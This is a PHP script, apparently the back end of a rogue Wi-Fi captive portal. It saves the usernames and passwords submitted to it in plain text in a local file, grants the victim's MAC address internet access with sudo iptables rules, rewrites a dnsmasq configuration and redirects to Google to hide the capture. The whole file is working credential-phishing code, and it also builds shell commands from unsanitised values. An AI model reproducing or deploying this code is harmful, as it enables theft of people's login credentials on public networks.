 <?php
    $name = $_POST['username'];
    $pass =  $_POST['password'];    
    $myfile = fopen("client_data.txt", "a") or die("Unable to open file!");
    $txt = "username: " . $name . "\t";
    $txt .= "password: " . $pass . " \n";
    fwrite($myfile, $txt);
    fclose($myfile);

    // Path to the arp command on the local server
    $arp = "/usr/sbin/arp";

    // The following file is used to keep track of users
    $users = "/var/lib/users";

    // Attempt to get the client's mac address
    $mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);

    $str_arr = explode (" ", $mac);
    $interface =$str_arr[count($str_arr)-1];

    
    preg_match('/..:..:..:..:..:../',$mac , $matches);
    @$mac = $matches[0];
 
    if (!isset($mac)) { exit; }

    enable_address();
    

    // This function enables the PC on the system by calling iptables, and also saving the
    // details in the users file for next time the firewall is reset

    function enable_address() {

        global $mac;
        global $interface;


        // Add PC to the firewall
        exec("sudo iptables -t nat -A PREROUTING -i $interface -s $mac -p tcp -ACCEPT");

        exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");

        $conf_text = "interface=$interface\ndhcp-range=192.168.24.25,192.168.24.50,255.255.255.0,12h";
        $conf_text .="\ndhcp-option=3,192.168.24.1\ndhcp-option=6,192.168.24.1";
        $conf_text .="\nserver=8.8.8.8\nlog-queries\nlog-dhcp";
        
        $contents = file_get_contents("path.txt");
        $file_name = "$contents/dnsmasq.conf";
        $conf_file = fopen($file_name, "w");
        fwrite($conf_file, $conf_text);
        fclose($conf_file);


        sleep(1);
        header("location:http://www.google.com");
        exit;
    }

?> 

